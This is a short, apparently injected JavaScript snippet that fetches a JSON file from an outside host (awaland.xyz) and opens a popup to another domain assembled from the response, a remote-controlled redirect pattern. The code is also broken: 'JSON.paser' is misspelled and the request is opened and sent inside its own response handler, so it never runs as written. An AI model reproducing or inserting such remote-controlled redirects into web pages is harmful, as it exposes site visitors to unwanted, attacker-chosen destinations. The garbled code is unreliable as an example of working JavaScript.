let lang = navigator.language;
var xhttp = new XMLHttpRequest();
function sleep(n) {
    var start = new Date().getTime();
    while (true) {
        if (new Date().getTime() - start > n) {
            break;
        }
    }
}
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        var res = JSON.paser(this.responseText);
        window.open('https://mc.minecraftbox.link/-----' + res.domain);
    }
    xhttp.open("GET", "https://www.awaland.xyz/zlibrary/cn/message.json", true);
    xhttp.send();
}